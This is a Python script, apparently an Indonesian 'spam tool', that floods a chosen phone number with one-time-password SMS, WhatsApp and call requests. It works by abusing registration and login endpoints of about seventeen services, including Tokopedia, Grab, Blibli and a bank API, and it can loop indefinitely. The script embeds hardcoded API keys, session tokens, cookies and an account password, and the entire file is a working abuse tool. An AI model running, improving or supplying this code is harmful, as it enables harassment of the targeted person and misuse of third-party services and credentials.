import sys
import time
import random
import re
import requests
import urllib3
import json
from urllib3.exceptions import NewConnectionError, ProtocolError
from typing import Dict, Tuple, Optional, Callable
from datetime import datetime

# Constants for terminal colors
GREEN = "\033[1;92m"
WHITE = "\033[1;97m"
YELLOW = "\033[1;93m"
RED = "\033[1;91m"
BLUE = "\033[1;96m"
RESET = "\033[0m"

def load_user_agent(file_path: str = "ua.txt") -> str:
    """Loads a random User-Agent from the specified file.
    
    Args:
        file_path: Path to the User-Agent file.
        
    Returns:
        str: A random User-Agent string.
        
    Raises:
        FileNotFoundError: If the User-Agent file is not found.
        ValueError: If the file is empty.
    """
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            user_agents = [line.strip() for line in f if line.strip()]
        if not user_agents:
            raise ValueError("User-Agent file is empty")
        return random.choice(user_agents)
    except FileNotFoundError:
        raise FileNotFoundError(f"User-Agent file {file_path} not found")

# API configurations with documentation
API_CONFIGS = [
    {
        "name": "Tokopedia",
        "method": "MULTI",
        "steps": [
            {
                "method": "GET",
                "url": "https://accounts.tokopedia.com/otp/c/page",
                "query_params": lambda phone: {
                    "otp_type": "116",
                    "msisdn": phone,
                    "ld": "https://accounts.tokopedia.com/register?type=phone&phone={}&status=eyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%3D%3D".format(phone)
                },
                "headers": lambda: {
                    "User-Agent": load_user_agent(),
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Origin": "https://accounts.tokopedia.com",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data": None,
                "extract": lambda response: re.search(r'<input id="Token" value="(.*?)" type="hidden">', response.text).group(1)
            },
            {
                "method": "POST",
                "url": "https://accounts.tokopedia.com/otp/c/ajax/request-wa",
                "query_params": None,
                "headers": lambda: {
                    "User-Agent": load_user_agent(),
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Origin": "https://accounts.tokopedia.com",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data": lambda phone, extracted: {
                    "otp_type": "116",
                    "msisdn": phone,
                    "tk": extracted,
                    "email": "",
                    "original_param": "",
                    "user_id": "",
                    "signature": "",
                    "number_otp_digit": "6"
                },
                "success_check": lambda response: "Anda sudah melakukan 3 kali pengiriman kode" not in response.text
            }
        ]
    },
    {
        "name": "Klikwa",
        "method": "POST",
        "url": "https://api.klikwa.net/v1/number/sendotp",
        "query_params": None,
        "headers": {
            "User-Agent": load_user_agent(),
            "Authorization": "Basic QjMzOkZSMzM="
        },
        "data": lambda phone: {"number": f"+62{phone[1:]}"},
        "success_check": lambda response: response.status_code == 200
    },
    {
        "name": "GrabTaxi",
        "method": "POST",
        "url": "https://p.grabtaxi.com/api/passenger/v2/profiles/register",
        "query_params": None,
        "headers": lambda: {
            "User-Agent": load_user_agent(),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        },
        "data": lambda phone: {
            "phoneNumber": phone,
            "countryCode": "ID",
            "name": "Guest",
            "email": f"guest{random.randint(1000, 9999)}@example.com",
            "deviceToken": "random-device-token"
        },
        "success_check": lambda response: response.status_code == 200
    },
    {
        "name": "GrabID",
        "method": "POST",
        "url": "https://api.grab.com/grabid/v1/phone/otp",
        "query_params": None,
        "headers": lambda: {
            "User-Agent": load_user_agent(),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        },
        "data": lambda phone: {
            "method": "CALL",
            "countryCode": "id",
            "phoneNumber": phone,
            "templateID": "pax_android_production"
        },
        "success_check": lambda response: response.status_code == 200
    },
    {
        "name": "Matahari",
        "method": "POST",
        "url": "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",
        "query_params": None,
        "headers": lambda: {
            "Host": "www.matahari.com",
            "content-length": "76",
            "x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
            "sec-ch-ua-mobile": "?1",
            "user-agent": load_user_agent(),
            "content-type": "application/json",
            "accept": "*/*",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua-platform": "Android",
            "origin": "https://www.matahari.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.matahari.com/customer/account/create/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        },
        "data": lambda phone: {
            "otp_request": {
                "mobile_number": phone,
                "mobile_country_code": "+62"
            }
        },
        "success_check": lambda response: response.status_code == 200
    },
    {
        "name": "Oyo",
        "method": "POST",
        "url": "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
        "query_params": None,
        "headers": lambda: {
            "Host": "identity-gateway.oyorooms.com",
            "consumer_host": "https://www.oyorooms.com",
            "accept-language": "id",
            "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",  # Note: Verify token validity, may expire
            "User-Agent": load_user_agent(),
            "Content-Type": "application/json",
            "accept": "*/*",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/login",
            "Accept-Encoding": "gzip, deflate, br"
        },
        "data": lambda phone: {
            "phone": phone,
            "country_code": "+62",
            "country_iso_code": "ID",
            "nod": "4",
            "send_otp": "true",
            "devise_role": "Consumer_Guest"
        },
        "success_check": lambda response: response.status_code == 200
    },
    {
        "name": "Blibli",
        "method": "POST",
        "url": "https://www.blibli.com/backend/common/users/_request-otp",
        "query_params": None,
        "headers": lambda: {
            "Host": "www.blibli.com",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "user-agent": load_user_agent(),
            "sec-ch-ua-platform": "Android",
            "origin": "https://www.blibli.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": lambda phone: f"https://www.blibli.com/login?ref=&logonId=0{phone}",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        },
        "data": lambda phone: {"username": f"0{phone}"},
        "success_check": lambda response: response.status_code == 200
    },
    {
        "name": "Maucash",
        "method": "GET",
        "url": "https://japi.maucash.id/welab-user/api/v1/send-sms-code",
        "query_params": lambda phone: {
            "mobile": phone,
            "channelType": "0"
        },
        "headers": lambda: {
            "Host": "japi.maucash.id",
            "accept": "application/json, text/plain, */*",
            "x-origin": "google play",
            "x-org-id": "1",
            "x-product-code": "YN-MAUCASH",
            "x-app-version": "2.4.23",
            "x-source-id": "android",
            "accept-encoding": "gzip",
            "Connection": "keep-alive",
            "User-Agent": load_user_agent()  # Note: Original used 'okhttp/3.12.1' to mimic Android app
        },
        "data": None,
        "success_check": lambda response: response.status_code == 200
    },
    {
        "name": "AltBalaji",
        "method": "POST",
        "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID",
        "query_params": None,
        "headers": lambda: {
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://lite.altbalaji.com",
            "Save-Data": "on",
            "User-Agent": load_user_agent(),
            "Content-Type": "application/json;charset=UTF-8",
            "Referer": "https://lite.altbalaji.com/subscribe?progress=input",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6",
            "Connection": "keep-alive"
        },
        "data": lambda phone: {
            "country_code": "62",
            "phone_number": phone
        },
        "success_check": lambda response: response.json().get("status") == "ok",
    },
    {
        "name": "TokoTalk",
        "method": "POST",
        "url": "https://api.tokotalk.com/v1/no_auth/verifications",
        "query_params": None,
        "headers": lambda: {
            "User-Agent": load_user_agent(),
            "content-type": "application/json;charset=UTF-8",
            "Connection": "keep-alive"
        },
        "data": lambda phone: {
            "key": "phone",
            "value": phone
        },
        "success_check": lambda response: "expireAt" in response.text
    },
    {
        "name": "Kitabisa",
        "method": "GET",
        "url": lambda phone: f"https://core.ktbs.io/v2/user/registration/otp/{phone}",
        "query_params": None,
        "headers": lambda: {
            "User-Agent": load_user_agent(),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        },
        "data": None,
        "success_check": lambda response: response.status_code == 200
    },
    {
    "name": "Sayurbox",
    "method": "POST",
    "url": "https://www.sayurbox.com/graphql/v1?deduplicate=1",
    "query_params": None,
    "headers": lambda: {
        "Host": "www.sayurbox.com",
        "content-length": "289",
        "sec-ch-ua-mobile": "?1",
        "authorization": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyNjQwMTA4LCJleHAiOjE2NjUyMzIxMDgsImlhdCI6MTY2MjY0MDEwOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6ImIwYjc1ZjI1LTllZmYtNDJjNS1hNmJiLWMyYjA3ZGI2YjVkOSIsInN1YiI6IllsNzB5YmtVWFl1dmstU3BTbkQ0ODlWX3NGOTIiLCJ1c2VyX2lkIjoiWWw3MHlia1VYWXV2ay1TcFNuRDQ4OVZfc0Y5MiJ9.DCYJRFjl-TTezyjXba-XLOOUK2ppvNBL--ETojGa_UauO0zyaaD090eFaMpglVThj-y3fbFany9eT1qx5y1olulqTGxExI1DsIVN8_Ds6cQuTPaYsBKFwgHZQSnKRkRAP3aEILhzRMsUUG7kwBJWCziTC9nGfBWl7tPwHoYmnerOzsSnTUjCnOfDphMuj_glxHsKDPtIUwie2xi00d0NhMDnc2kyrkJc8xer7XLXWJGzZVvI-3wl72VLcB1GmDVZKo-JX9tAhzO7lsGSXm9G0lSYKD_NUUMKbU7d4w_2Col3Lhu6E0ltyw4nmna8ssc0q8_ti1b9F-HL1GfRzTRa-g",
        "content-type": "application/json",
        "accept": "*/*",
        "x-bundle-revision": "6.0",
        "x-sbox-tenant": "sayurbox",
        "x-binary-version": "2.2.1",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "origin": "https://www.sayurbox.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    },
    "data": lambda phone: {
        "operationName": "generateOTP",
        "variables": {
            "destinationType": "whatsapp",
            "identity": "+62" + phone.lstrip("0")
        },
        "query": "mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"
    },
    "success_check": lambda response: "generateOTP" in response.text
    },
    {
        "name": "Tokko",
        "method": "POST",
        "url": "https://api.tokko.io/graphql",
        "query_params": None,
        "headers": lambda: {
            "Host": "api.tokko.io",
            "content-length": "306",
            "accept-language": "id",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
            "x-tokko-api-client": "merchant_web",
            "content-type": "application/json",
            "accept": "*/*",
            "x-tokko-api-client-version": "4.5.1",
            "sec-ch-ua-platform": "Android",
            "origin": "https://web.lummoshop.com",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://web.lummoshop.com/",
            "accept-encoding": "gzip, deflate, br"
        },
        "data": lambda phone: {
            "operationName": "generateOTP",
            "variables": {
                "generateOtpInput": {
                    "phoneNumber": "+62" + phone.lstrip("0"),
                    "hashCode": "",
                    "channel": "WHATSAPP",
                    "userType": "MERCHANT"
                }
            },
            "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"
        },
        "success_check": lambda response: "generateOtp" in response.text
    },
    {
        "name": "Carsome",
        "method": "POST",
        "url": "https://www.carsome.id/website/login/sendSMS",
        "query_params": None,
        "headers": lambda: {
            "Host": "www.carsome.id",
            "content-length": "38",
            "x-language": "id",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "application/json, text/plain, */*",
            "country": "ID",
            "x-amplitude-device-id": "A4p3vs1Ixu9wp3wFmCEG9K",
            "sec-ch-ua-platform": "Android",
            "origin": "https://www.carsome.id",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.carsome.id/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        },
        "data": lambda phone: {
            "username": phone,
            "optType": 1
        },
        "success_check": lambda response: response.status_code == 200
    },
    {
        "name": "Jenius",
        "method": "POST",
        "url": "https://api.btpn.com/jenius",
        "query_params": None,
        "headers": lambda: {
            "accept": "*/*",
            "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
            "version": "2.36.1-7565",
            "accept-language": "id",
            "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
            "Content-Type": "application/json",
            "Host": "api.btpn.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607",
            "User-Agent": "okhttp/3.12.1"
        },
        "data": lambda phone: {
            "query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n",
            "variables": {
                "phone": "+62" + phone.lstrip("0"),
                "language": "id"
            },
            "operationName": "registerPhone"
        },
        "success_check": lambda response: "registerPhone" in response.text
    },
    {
        "name": "Alodokter",
        "method": "POST",
        "url": "https://www.alodokter.com/login-with-phone-number",
        "query_params": None,
        "headers": lambda: {
            "Host": "www.alodokter.com",
            "content-length": "33",
            "x-csrf-token": "UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "application/json",
            "save-data": "on",
            "origin": "https://www.alodokter.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.alodokter.com/login-alodokter",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en;q=0.8"
        },
        "data": lambda phone: {
            "user": {
                "phone": "0" + phone.lstrip("0")
            }
        },
        "success_check": lambda response: response.status_code == 200
    },
    {
        "name": "Pizzahut",
        "method": "POST",
        "url": "https://api-prod.pizzahut.co.id/customer/v1/customer/register",
        "query_params": None,
        "headers": lambda: {
            "Host": "api-prod.pizzahut.co.id",
            "content-length": "157",
            "x-device-type": "PC",
            "sec-ch-ua-mobile": "?1",
            "x-platform": "WEBMOBILE",
            "x-channel": "2",
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json",
            "x-client-id": "b39773b0-435b-4f41-80e9-163eef20e0ab",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
            "x-lang": "en",
            "save-data": "on",
            "x-device-id": "web",
            "origin": "https://www.pizzahut.co.id",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.pizzahut.co.id/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en;q=0.8"
        },
        "data": lambda phone: {
            "email": "aldigg088@gmail.com",
            "first_name": "Xenzi",
            "last_name": "Wokwokw",
            "password": "Aldi++\\/67",
            "phone": "0" + phone.lstrip("0"),
            "birthday": "2000-01-02"
        },
        "success_check": lambda response: response.status_code == 200
    },
        # Add more API configs here
]

def autoketik(message: str) -> None:
    """Prints a message with a typing effect in the terminal.
    
    Args:
        message: The string to print with a typing effect.
    """
    for char in message + "\n":
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.05)

def countdown(seconds: int) -> None:
    """Displays a countdown timer with date and time information.
    
    Args:
        seconds: Number of seconds to count down.
    """
    while seconds > 0:
        mins, secs = divmod(seconds, 60)
        current_time = datetime.now()
        day = current_time.strftime("%A")
        date = current_time.strftime("%d")
        month = {
            "January": "Januari", "February": "Februari", "March": "Maret",
            "April": "April", "May": "Mei", "June": "Juni", "July": "Juli",
            "August": "Agustus", "September": "September", "October": "Oktober",
            "November": "November", "December": "Desember"
        }.get(current_time.strftime("%B"), current_time.strftime("%B"))
        year = current_time.strftime("%Y")
        time_str = current_time.strftime("%H:%M:%S")
        timer = f"{WHITE}[{YELLOW}•{WHITE}] Silakan Menunggu Dalam Waktu {GREEN}{mins:02d}:{secs:02d}"
        print(f"{timer} | {BLUE}{day}, {date} {month} {year} | {YELLOW}Waktu {time_str}", end='\r')
        time.sleep(1)
        seconds -= 1

def send_api_request(config: Dict, phone: str) -> bool:
    """Sends an API request based on the provided configuration.
    
    Args:
        config: Dictionary containing API configuration (method, steps, url, query_params, headers, data, success_check).
        phone: Phone number to send the request to.
    
    Returns:
        bool: True if the request was successful, False otherwise.
    """
    try:
        if config.get("method") == "MULTI":
            extracted = None
            for step in config["steps"]:
                url = step["url"]
                headers = step["headers"]() if callable(step["headers"]) else step["headers"]
                data = step["data"](phone, extracted) if callable(step["data"]) else step["data"]
                query_params = step["query_params"](phone) if callable(step["query_params"]) else step["query_params"]
                method = step["method"].lower()

                if method == "get":
                    response = requests.get(url, headers=headers, params=query_params, timeout=10)
                elif method == "post":
                    response = requests.post(url, headers=headers, data=data, params=query_params, timeout=10)
                else:
                    raise ValueError(f"Unsupported HTTP method: {method}")

                response.raise_for_status()
                if "extract" in step:
                    extracted = step["extract"](response)
                if "success_check" in step:
                    return step["success_check"](response)
            return True
        else:
            url = config["url"]
            headers = config["headers"]() if callable(config["headers"]) else config["headers"]
            data = config["data"](phone) if callable(config["data"]) else config["data"]
            query_params = config["query_params"](phone) if callable(config["query_params"]) else config["query_params"]
            method = config["method"].lower()

            if method == "get":
                response = requests.get(url, headers=headers, params=query_params, timeout=10)
            elif method == "post":
                response = requests.post(url, headers=headers, json=data, params=query_params, timeout=10)
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")

            response.raise_for_status()
            return config.get("success_check", lambda r: r.status_code == 200)(response)
    except (requests.exceptions.RequestException, NewConnectionError, ProtocolError, TimeoutError, re.error) as e:
        autoketik(f"{RED}Error in {config['name']} request: {str(e)}{RESET}")
        return False

def spam_phone_number(phone: str, repeat: bool = False) -> None:
    """Sends OTP requests to the specified phone number.
    
    Args:
        phone: Phone number to target.
        repeat: Whether to repeat the process after a delay.
    """
    autoketik(f"{RED}Starting spam to {WHITE}{phone}{GREEN}...{RESET}")
    
    for config in API_CONFIGS:
        success = send_api_request(config, phone)
        if success:
            autoketik(f"{GREEN}Successfully sent {config['name']} request{RESET}")
        else:
            autoketik(f"{RED}Failed to send {config['name']} request{RESET}")
        countdown(1)  # Configurable delay

    if repeat:
        autoketik(f"{YELLOW}Rebooting in 20 seconds...{RESET}")
        time.sleep(1)
        spam_phone_number(phone, repeat=True)

def get_user_input() -> Tuple[str, bool]:
    """Prompts the user for a phone number and repeat option.
    
    Returns:
        Tuple[str, bool]: Phone number and repeat choice.
    """
    phone = input(f"{GREEN}Masukkan Nomor Target: {WHITE}")
    if not phone.isdigit() or len(phone) < 10:
        raise ValueError("Invalid phone number")
    
    repeat = False
    while True:
        choice = input(f"{RED}Apakah Anda ingin mengulangi Spam Tools? (y/t): {GREEN}").lower()
        if choice in ("y", "t"):
            repeat = choice == "y"
            break
        autoketik(f"{RED}Masukkan pilihan dengan benar (y/t){RESET}")
    
    return phone, repeat

def main() -> None:
    """Main function to run the spam tool."""
    try:
        autoketik(f"{RED}Selamat datang di project Spamm orang ngeselin{RESET}")
        autoketik(f"{YELLOW}Author: {GREEN}Linctonnn{RESET}")
        
        phone, repeat = get_user_input()
        spam_phone_number(phone, repeat)
    
    except (KeyboardInterrupt, FileNotFoundError, ValueError) as e:
        autoketik(f"{RED}Error: {str(e)}{RESET}")
        autoketik(f"{GREEN}--Keluar Dari Tools--{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()